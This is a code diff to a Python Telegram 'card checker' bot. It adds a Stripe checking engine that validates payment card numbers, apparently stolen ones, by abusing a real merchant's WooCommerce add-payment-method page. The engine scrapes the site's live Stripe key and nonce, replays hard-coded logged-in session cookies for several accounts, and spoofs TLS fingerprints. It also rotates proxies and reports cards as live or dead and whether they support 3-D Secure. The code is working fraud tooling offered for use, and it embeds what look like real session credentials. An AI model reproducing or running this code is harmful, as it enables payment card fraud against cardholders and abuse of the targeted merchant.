@@ -4,6 +4,58 @@ import time
 import threading
 import random
 import os
+import uuid
+import re
+import tls_client
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# --- STRIPE CONFIGURATION ---
+ACCOUNT_POOL = [
+    {
+        'name': 'baxterleonilo777',
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
+        'cookies': {
+            '__cf_bm': 'vGy.OykJhqx7xWyHeGUE0aL2ObON.VchpONaebF.zis-1772035713-1.0.1.1-JTYj8JKyk.GDzPJmehgLbua28dt4kmaIm..840UJ73pim.bfxohaOrN9wdbiowH47zQdZ6mtVzygmNdxojN5kg3Ou6PThQRR50IwAJDRMrY',
+            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '10289%7Cother%7Cread%7C41c3e4b7ffe117d411ee862661589aac8cfb70edd99db1aaea543004cf106a83',
+            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'baxterleonilo777%7C1773245560%7C6KDjNCVgZJp9Y1g1Pd9HWoo62KFVfoSaSBVw5YewKEU%7Cc9cbc401a46db87a05b8b2606496026203e42d6466f62bb7350bbef748525c51',
+            '__stripe_mid': '0dddfbcb-3c61-4d46-bf6a-22124c711398c3c7f7',
+            '__stripe_sid': '467d3c3a-732d-488e-8cfd-4decbb5e7d6a1705af',
+        }
+    },
+    {
+        'name': 'cuongthinh247',
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+        'cookies': {
+            '__cf_bm': 'ydk_zdPH07PQ1fRnpVk7GB62nZ1LuFqhs7lE2nHjefc-1772036630-1.0.1.1-k6.f_6Xx5qkYaWEbl0myeBiECR2Md1s5WCsu8huBPhg0LjUHqvojHfJepkk9lhI2GJ6BEaXoypHxF_Rz8zg5oRZRUH5PMCt9.FnJPheR7cw',
+            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '10290%7Cother%7Cread%7Ce10c060644eb6e19b7598fd07a3cb5e56a3b9afb17ebd47db29e4d77de7e0d37',
+            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'cuongthinh247%7C1773246277%7CZVJ4nAOlUalLXJu2IgVVhKD6jcu7QrmnhZNkzxeU1BY%7C04c5e82f21ec231302787c1b9396d4b53a1a4b7e44526ac6a0445985b92f9e3b',
+            '__stripe_mid': '7f68bfe7-cf1b-4c51-a0ee-7029aec49160f78e1f',
+            '__stripe_sid': 'ef2b5b6c-75f1-4330-8a49-b4e44af89627bf05b8',
+        }
+    },
+    {
+        'name': 'baxterleonilo',
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
+        'cookies': {
+            '__cf_bm': 'bdEojoDtGywM0ZSEKPlrHCbamL4GxJVKEBCXLP3Pfrs-1772036823-1.0.1.1-W4DiPiXtmhHP7gKbDtOm5sPfvIlkb6_9Sf0BI3EvW_LkJvgdzKteE.R2en4qzpFWMPdK4WVW6sAYf1TLOj02a6JbwKDPQq8AN1fKbQ5a2ws',
+            'wfwaf-authcookie-69aad1faf32f3793e60643cdfdc85e58': '10291%7Cother%7Cread%7C4cd723e9413afc81ff94de39b3f207c68159ab31fd8d308d6b8791e734939a72',
+            'wordpress_logged_in_9f53720c758e9816a2dcc8ca08e321a9': 'baxterleonilo%7C1773246461%7Ca25bkxDbdosl3YQMJqd06SIfi3b6C9unErXtVwzb45h%7Caa0a50a26ff5a8e22c96d2cc927c80798331072465cfc7247ce0a2f0c95d2db1',
+            '__stripe_mid': 'd176f8c5-7a57-4612-8d06-0daca2c592bccf9867',
+            '__stripe_sid': 'c5ac0e78-4f36-48be-aab4-cd44ae5d4f97871549',
+        }
+    }
+]
+
+ULTRA_HEADERS = {
+    'authority': 'associationsmanagement.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'accept-language': 'en-US,en;q=0.9',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+}
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # ==================== CONFIGURATION ====================
@@ -305,6 +357,126 @@ def parse_card_input(line):
     check_format = f"{card_number}|{month}|{year}|{cvv}"
     return {"check_format": check_format, "extra_info": ""}
 
+# ==================== STRIPE ENGINE ====================
+
+def get_bin_info(n):
+    n = n.replace(" ", "")[:8]
+    apis = [
+        f"https://lookup.binlist.net/{n}",
+        f"https://data.handyapi.com/bin/{n[:6]}",
+        f"https://api.bincheck.io/bin/{n[:6]}",
+        f"https://projectsloth.io/bin/{n[:6]}",
+        f"https://fayderal.site/api/bin/{n[:6]}"
+    ]
+    for api in apis:
+        try:
+            r = requests.get(api, timeout=4)
+            if r.status_code == 200:
+                data = r.json()
+                brand = (data.get('scheme') or data.get('brand') or 'N/A').upper()
+                bank = (data.get('bank', {}).get('name') or data.get('Bank') or 'N/A').upper()
+                country = (data.get('country', {}).get('name') or 'N/A').upper()
+                emoji = data.get('country', {}).get('emoji') or '🏳️'
+                return f"{brand} | {bank} | {country} {emoji}"
+        except: continue
+    return "BIN INFO NOT FOUND"
+
+def check_stripe_card(card_line, proxy=None, mode="auth"):
+    try:
+        n, mm, yy, cvc = [x.strip() for x in card_line.split('|')]
+        yy = f"20{yy[-2:]}" if len(yy) <= 2 else yy
+        acc = random.choice(ACCOUNT_POOL)
+        bin_meta = get_bin_info(n)
+        
+        user_agent = acc.get('user_agent', ULTRA_HEADERS['user-agent'])
+        is_mobile = 'Android' in user_agent or 'Mobile' in user_agent
+        platform = 'android' if is_mobile else 'windows'
+        
+        scraper = tls_client.Session(
+            client_identifier='chrome_120' if not is_mobile else 'chrome_120_android',
+            random_tls_extension_order=True
+        )
+        
+        if proxy and len(proxy) > 5:
+            scraper.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+        
+        scraper.cookies.update(acc['cookies'])
+        
+        custom_headers = ULTRA_HEADERS.copy()
+        custom_headers['user-agent'] = user_agent
+        if not is_mobile:
+            custom_headers['sec-ch-ua-platform'] = '"Windows"'
+            custom_headers['sec-ch-ua-mobile'] = '?0'
+            
+        scraper.headers.update(custom_headers)
+
+        # 1. Page Connect
+        r_page = scraper.get("https://associationsmanagement.com/my-account/add-payment-method/", timeout_seconds=25)
+        
+        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r_page.text)
+        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-z0-9]+)"', r_page.text)
+        
+        if not pk_match or not nonce_match:
+            return {"status": "DEAD", "response": "Cookies Expired or CF Blocked", "extra": bin_meta}
+            
+        pk_live = pk_match.group(0)
+        addnonce = nonce_match.group(1)
+
+        time.sleep(random.uniform(2.5, 3.5))
+
+        stripe_hd = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'user-agent': user_agent,
+        }
+
+        stripe_payload = (
+            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}'
+            f'&billing_details[name]={acc["name"].replace(" ", "+")}'
+            f'&billing_details[address][postal_code]=10001'
+            f'&key={pk_live}'
+            f'&muid={acc["cookies"].get("__stripe_mid", str(uuid.uuid4()))}'
+            f'&sid={acc["cookies"].get("__stripe_sid", str(uuid.uuid4()))}'
+            f'&guid={str(uuid.uuid4())}'
+            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
+            f'&time_on_page={random.randint(90000, 150000)}'
+        )
+
+        r_stripe_req = scraper.post('https://api.stripe.com/v1/payment_methods', headers=stripe_hd, data=stripe_payload)
+        r_stripe = r_stripe_req.json()
+
+        if 'id' not in r_stripe:
+            err = r_stripe.get('error', {}).get('message', 'Radar Security Block')
+            return {"status": "DEAD", "response": err, "extra": bin_meta}
+
+        if mode == "vbv":
+            vbv_status = r_stripe.get('card', {}).get('three_d_secure_usage', {}).get('supported', 'unknown')
+            return {"status": "LIVE", "response": f"VBV: {str(vbv_status).upper()}", "extra": bin_meta}
+
+        # 3. Final Ajax
+        ajax_data = {
+            'action': 'wc_stripe_create_and_confirm_setup_intent',
+            'wc-stripe-payment-method': r_stripe['id'],
+            'wc-stripe-payment-type': 'card',
+            '_ajax_nonce': addnonce,
+        }
+        r_ajax = scraper.post('https://associationsmanagement.com/wp-admin/admin-ajax.php', data=ajax_data, timeout_seconds=20).text
+        
+        if '"success":true' in r_ajax.lower() or 'insufficient_funds' in r_ajax.lower(): 
+            return {"status": "LIVE", "response": "Approved ✅", "extra": bin_meta}
+        if 'incorrect_cvc' in r_ajax.lower(): 
+            return {"status": "LIVE", "response": "CVC Matched ✅", "extra": bin_meta}
+        
+        reason_match = re.search(r'message\":\"(.*?)\"', r_ajax)
+        reason = reason_match.group(1) if reason_match else 'Rejected'
+        return {"status": "DEAD", "response": reason, "extra": bin_meta}
+
+    except Exception as e: 
+        return {"status": "DEAD", "response": f"System Error: {str(e)[:50]}", "extra": "N/A"}
+
 # ==================== API CHECK ====================
 
 def check_card(card_format, site, proxy):
@@ -441,33 +613,21 @@ def handle_start(chat_id, user_msg_id):
     pool_size = len(get_proxy_pool())
     pool_info = f"✅ {pool_size} proxies (parallel)" if pool_size > 0 else "⚠️ Empty (sequential)"
     text = (
-        "🔥 <b>Card Checker Bot</b>\n"
+        "🔥 <b>PREMIUM STRIPE CHECKER BOT</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
 
-        "💳 <b>CHECK CARDS (Shopify)</b>\n"
-        "<code>/chg 4111111111111111|03|2026|123</code>\n"
-        "<code>/chg</code>  <i>(nhiều thẻ, mỗi dòng 1 thẻ)</i>\n\n"
+        "💳 <b>STRIPE AUTH GATE</b>\n"
+        "<code>/au 4111111111111111|03|2026|123</code>\n"
+        "<code>/au</code>  <i>(nhiều thẻ, mỗi dòng 1 thẻ)</i>\n\n"
 
-        "🅿️ <b>CHECK PAYPAL</b>\n"
-        "<code>/pp 4117740076639353|09|2029|128</code>\n"
-        "<code>/pp</code>  <i>(nhiều thẻ, tối đa 20)</i>\n\n"
-
-        "🌿 <b>CHECK BRAINTREE</b>\n"
-        "<code>/b3 4117740076639353|09|2029|128</code>\n"
-        "<code>/b3</code>  <i>(nhiều thẻ, tối đa 20)</i>\n\n"
-
-        "🎲 <b>GENERATE CARDS</b>\n"
-        "<code>/gen 414170</code>  — 10 thẻ ngẫu nhiên\n"
-        "<code>/gen 414170 20</code>  — 20 thẻ\n"
-        "<code>/gen 414170|03|2026</code>  — cố định exp\n"
-        "<code>/gen 4147xxxxxxxx</code>  — x = số ngẫu nhiên\n\n"
+        "🛡️ <b>STRIPE VBV CHECK</b>\n"
+        "<code>/vbv 4111111111111111|03|2026|123</code>\n"
+        "<code>/vbv</code>  <i>(nhiều thẻ, mỗi dòng 1 thẻ)</i>\n\n"
 
         "⚙️ <b>SETTINGS</b>\n"
         "<code>/settings</code>  — Xem cài đặt hiện tại\n"
-        "<code>/setsite URL</code>  — Đổi site\n"
         "<code>/setproxy host:port:user:pass</code>  — Đổi proxy cá nhân\n"
-        "<code>/resetsite</code>  /  <code>/resetproxy</code>  — Reset về mặc định\n"
-        "<code>/listsite</code>  — Danh sách site khả dụng\n\n"
+        "<code>/resetproxy</code>  — Reset proxy về mặc định\n\n"
 
         "🔧 <b>TOOLS</b>\n"
         "<code>/myid</code>  — ID Telegram của bạn\n"
@@ -647,12 +807,13 @@ def handle_listsite(chat_id, user_id, text, user_msg_id):
     msg_ids_to_delete.append(msg_id)
     schedule_delete_multiple(chat_id, msg_ids_to_delete)
 
-def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
-    """Handle /chg command - check cards (parallel if proxy pool available)"""
-    # Collect all message IDs to delete later
+def handle_stripe_check(chat_id, user_id, text, user_name, user_msg_id, mode="auth"):
+    """Handle /au and /vbv commands - check cards via Stripe engine"""
     msg_ids_to_delete = [user_msg_id]
 
-    # Parse cards from message
+    cmd_name = "/au" if mode == "auth" else "/vbv"
+    gate_name = "Auth Gate" if mode == "auth" else "VBV Check"
+
     lines = text.split('\n')
     first_line = lines[0]
     first_line_parts = first_line.split(maxsplit=1)
@@ -668,19 +829,18 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
 
     if not cards_text:
         msg_id = send_message(chat_id,
-            "❌ No cards found!\n\n"
-            "📋 Usage:\n"
-            "<code>/chg 5426340331431119|11|2026|079</code>\n\n"
-            "Or multiple cards:\n"
-            "<code>/chg\n"
-            "4147181435715762|10|2030|057\n"
-            "5426340331431119|11|2026|079</code>"
+            f"❌ No cards found!\n\n"
+            f"📋 Usage:\n"
+            f"<code>{cmd_name} 5426340331431119|11|2026|079</code>\n\n"
+            f"Or multiple cards:\n"
+            f"<code>{cmd_name}\n"
+            f"4147181435715762|10|2030|057\n"
+            f"5426340331431119|11|2026|079</code>"
         )
         msg_ids_to_delete.append(msg_id)
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
         return
 
-    # Parse all cards
     parsed_cards = []
     invalid_lines = []
     for card_text in cards_text:
@@ -696,28 +856,15 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
         schedule_delete_multiple(chat_id, msg_ids_to_delete)
         return
 
-    # Get THIS USER's settings (not chat-wide)
-    site, proxy = get_settings(user_id)
-
-    # Determine concurrency:
-    # - If proxy pool has proxies: use min(pool_size, 10) workers (true parallel)
-    # - If no proxy pool: still use parallel with min(total, 5) workers (same proxy, concurrent)
+    # Using proxy pool if available
     pool_size = len(get_proxy_pool())
-    if pool_size > 0:
-        max_workers = min(pool_size, 10)
-    else:
-        # Even without pool, run concurrently (API server handles rate limiting)
-        max_workers = min(total, 5)
-    parallel = True  # always parallel
-
-    # Send initial status message
+    max_workers = min(pool_size, 10) if pool_size > 0 else min(len(parsed_cards), 5)
+    
     total = len(parsed_cards)
-    if pool_size > 0:
-        proxy_info = f"🔀 Pool: {pool_size} proxies → parallel x{max_workers}"
-    else:
-        proxy_info = f"⚡ Parallel x{max_workers} (single proxy, concurrent)"
+    proxy_info = f"🔀 Pool: {pool_size} proxies → parallel x{max_workers}" if pool_size > 0 else f"⚡ Parallel x{max_workers} (concurrent)"
+    
     status_text = (
-        f"🔄 <b>Checking {total} card(s)...</b>\n"
+        f"🔄 <b>{gate_name} - Checking {total} card(s)...</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 User: {user_name}\n"
         f"{proxy_info}\n"
@@ -731,8 +878,6 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
     status_msg_id = send_message(chat_id, status_text)
     msg_ids_to_delete.append(status_msg_id)
 
-    # ---- Parallel or sequential checking ----
-    # results_map: index -> result_line (to preserve order)
     results_map = {}
     live_count = 0
     die_count = 0
@@ -743,37 +888,24 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
     def _check_one(idx, card_data):
         card_format = card_data['check_format']
         extra_info = card_data['extra_info']
-        response_text = check_card(card_format, site, proxy)
-        data = parse_response(response_text)
-        price = data.get('price', 'N/A')
-        response = data.get('response', 'N/A')
-        order_url = data.get('order_url', '')
-        gate = data.get('gate', '')
+        
+        # Use next proxy from pool if available
+        effective_proxy = get_next_proxy() if pool_size > 0 else None
+        
+        data = check_stripe_card(card_format, effective_proxy, mode)
+        status_val = data.get("status", "DEAD")
+        resp_val = data.get("response", "N/A")
+        extra_val = data.get("extra", "")
 
-        if is_live(response, order_url):
-            status_label = "LIVE"
-            emoji = "✅"
-            is_live_card = True
-        elif is_site_error(response):
-            status_label = "SITE_ERR"
-            emoji = "⚠️"
-            is_live_card = False
-        else:
-            status_label = "DIE"
-            emoji = "❌"
-            is_live_card = False
+        is_live_card = (status_val == "LIVE")
+        emoji = "✅" if is_live_card else "❌"
 
-        result_line = f"{emoji} <code>{card_format}</code> | {price} | {response} | {status_label}"
-        if extra_info:
-            result_line += f" | {extra_info}"
-        if status_label == "LIVE" and order_url:
-            result_line += f"\n   📦 <a href='{order_url}'>Order URL</a>"
-        if gate:
-            result_line += f" | {gate}"
+        result_line = f"{emoji} <code>{card_format}</code> | {resp_val}"
+        if extra_val:
+            result_line += f" | {extra_val}"
 
-        return idx, result_line, is_live_card, status_label
+        return idx, result_line, is_live_card
 
-    # Always run parallel (ThreadPoolExecutor handles concurrency)
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         futures = {
             executor.submit(_check_one, i, card_data): i
@@ -781,7 +913,7 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
         }
         for future in as_completed(futures):
             try:
-                idx, result_line, is_live_card, status_label = future.result()
+                idx, result_line, is_live_card = future.result()
             except Exception as exc:
                 idx = futures[future]
                 result_line = f"❌ <code>ERROR</code> | {exc}"
@@ -796,17 +928,15 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
                 completed += 1
                 done = completed
 
-            # Update progress every card (or every 3 for large batches)
             update_interval = 1 if total <= 5 else 3
             if status_msg_id and (done % update_interval == 0 or done == total):
                 elapsed = int(time.time() - start_time)
                 recent = [results_map[k] for k in sorted(results_map)[-5:]]
                 progress_text = (
-                    f"🔄 <b>Checking {total} card(s)...</b>\n"
+                    f"🔄 <b>{gate_name} - Checking {total} card(s)...</b>\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"👤 User: {user_name}\n"
-                    f"⚡ Parallel x{max_workers}"
-                    + (f" | {pool_size} proxies" if pool_size > 0 else "") + "\n"
+                    f"⚡ Parallel x{max_workers}" + (f" | {pool_size} proxies" if pool_size > 0 else "") + "\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     f"📊 Progress: {done}/{total}\n"
                     f"✅ Live: {live_count} | ❌ Die: {die_count}\n"
@@ -817,54 +947,27 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
                     progress_text += f"\n\n⏳ Checking remaining {total - done} card(s)..."
                 edit_message(chat_id, status_msg_id, progress_text)
 
-    # Build ordered results list
     results_text = [results_map[k] for k in sorted(results_map)]
-
-    # Final summary
     elapsed = int(time.time() - start_time)
     mins = elapsed // 60
     secs = elapsed % 60
 
-    # Check if all results were site errors
-    site_error_count = sum(1 for r in results_text if "SITE_ERR" in r)
-    all_site_errors = site_error_count == total
-
     final_text = (
-        f"📊 <b>CHECK COMPLETED</b>\n"
+        f"📊 <b>{gate_name.upper()} COMPLETED</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 User: {user_name}\n"
         f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
         f"⏱️ Time: {mins}m {secs}s\n"
-        f"🌐 Site: <code>{site}</code>\n"
-        f"⚡ Parallel x{max_workers}"
-        + (f" ({pool_size} proxies)" if pool_size > 0 else "") + "\n"
+        f"⚡ Parallel x{max_workers}" + (f" ({pool_size} proxies)" if pool_size > 0 else "") + "\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
     )
-    final_text += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-
-    if all_site_errors or site_error_count > 0:
-        final_text += (
-            f"⚠️ <b>SITE ERROR DETECTED ({site_error_count}/{total})</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"❗ Lý do: Site <code>{site}</code> không có product ID\n\n"
-            f"🔍 <b>Nguyên nhân có thể:</b>\n"
-            f"  • Site hết hàng / không có sản phẩm public\n"
-            f"  • Site bị Cloudflare / bot protection chặn\n"
-            f"  • Proxy bị block bởi site này\n"
-            f"  • Site đã thay đổi cấu trúc Shopify\n\n"
-            f"✅ <b>Cách fix:</b>\n"
-            f"  • Dùng <code>/listsite</code> để xem danh sách site khác\n"
-            f"  • Dùng <code>/setsite URL</code> để đổi sang site khác\n"
-            f"  • Dùng <code>/addproxy</code> để thêm proxy vào pool\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        )
 
     final_text += "\n".join(results_text)
     final_text += f"\n\n🗑️ <i>This message will be deleted in {AUTO_DELETE_DELAY}s</i>"
 
-    # Update or send final result
     if status_msg_id:
         if len(final_text) > 4000:
-            edit_message(chat_id, status_msg_id, "📊 Check completed! See results below ⬇️")
+            edit_message(chat_id, status_msg_id, f"📊 {gate_name} completed! See results below ⬇️")
             chunk = ""
             for line in results_text:
                 if len(chunk) + len(line) + 2 > 3500:
@@ -876,7 +979,7 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
                 chunk_msg_id = send_message(chat_id, chunk)
                 msg_ids_to_delete.append(chunk_msg_id)
             summary = (
-                f"\n📊 <b>SUMMARY</b>\n"
+                f"\n📊 <b>{gate_name.upper()} SUMMARY</b>\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
                 f"⏱️ Time: {mins}m {secs}s\n"
@@ -887,7 +990,6 @@ def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
         else:
             edit_message(chat_id, status_msg_id, final_text)
 
-    # Schedule auto-delete of ALL messages (user command + all bot replies)
     schedule_delete_multiple(chat_id, msg_ids_to_delete, delay=AUTO_DELETE_DELAY)
 
 # ==================== CARD GENERATION (BIN-based) ====================
@@ -2133,30 +2235,20 @@ def process_message(message):
         handle_start(chat_id, user_msg_id)
     elif text_lower.startswith("/chatid"):
         handle_chatid(chat_id, message, user_msg_id)
-    elif text_lower.startswith("/chg"):
-        handle_chg(chat_id, user_id, text, user_name, user_msg_id)
-    elif text_lower.startswith("/pp"):
-        handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, 'pp')
-    elif text_lower.startswith("/b3"):
-        handle_gateway_check(chat_id, user_id, text, user_name, user_msg_id, 'b3')
-    elif text_lower.startswith("/gen"):
-        handle_gen(chat_id, text, user_msg_id)
+    elif text_lower.startswith("/au"):
+        handle_stripe_check(chat_id, user_id, text, user_name, user_msg_id, mode="auth")
+    elif text_lower.startswith("/vbv"):
+        handle_stripe_check(chat_id, user_id, text, user_name, user_msg_id, mode="vbv")
     elif text_lower.startswith("/myid"):
         handle_myid(chat_id, user_id, user_msg_id)
     elif text_lower.startswith("/info"):
         handle_info(chat_id, user_id, message, user_msg_id)
     elif text_lower.startswith("/setproxy"):
         handle_setproxy(chat_id, user_id, text, user_msg_id)
-    elif text_lower.startswith("/setsite"):
-        handle_setsite(chat_id, user_id, text, user_msg_id)
     elif text_lower.startswith("/settings"):
         handle_settings(chat_id, user_id, user_msg_id)
     elif text_lower.startswith("/resetproxy"):
         handle_resetproxy(chat_id, user_id, user_msg_id)
-    elif text_lower.startswith("/resetsite"):
-        handle_resetsite(chat_id, user_id, user_msg_id)
-    elif text_lower.startswith("/listsite"):
-        handle_listsite(chat_id, user_id, text, user_msg_id)
     # Admin commands
     elif text_lower.startswith("/adefaultsite"):
         handle_admin_defaultsite(chat_id, user_id, text, user_msg_id)
